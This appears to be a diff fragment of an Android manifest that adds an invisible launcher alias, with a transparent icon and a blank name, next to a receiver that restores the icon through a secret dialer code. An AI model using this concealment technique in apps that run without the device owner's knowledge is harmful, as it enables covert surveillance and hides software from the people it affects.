@@ -90,6 +90,21 @@
             </intent-filter>
         </activity-alias>
 
+        <!-- Invisible Disguise Alias (Transparent Icon & Blank Name) -->
+        <activity-alias
+            android:name=".InvisibleAlias"
+            android:targetActivity=".MainActivity"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@drawable/ic_transparent"
+            android:label=" "
+            android:roundIcon="@drawable/ic_transparent">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
         <!-- Secret Code Receiver (*#*#767#*#*) to unhide launcher icon from dialer -->
         <receiver
             android:name=".receiver.SecretCodeReceiver"
